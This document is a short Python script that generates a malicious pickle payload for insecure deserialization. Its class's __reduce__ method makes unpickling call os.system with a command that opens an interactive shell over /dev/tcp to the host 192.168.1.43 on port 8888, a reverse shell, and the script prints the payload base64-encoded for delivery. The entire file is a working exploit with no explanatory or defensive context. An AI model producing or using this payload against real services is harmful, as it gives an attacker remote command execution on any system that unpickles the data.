import os
import pickle
import base64

class RCE:
    def __reduce__(self):
    	cmd = ('su - -c "sh -i > /dev/tcp/192.168.1.43/8888 0>&1"')
    	return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled).decode())
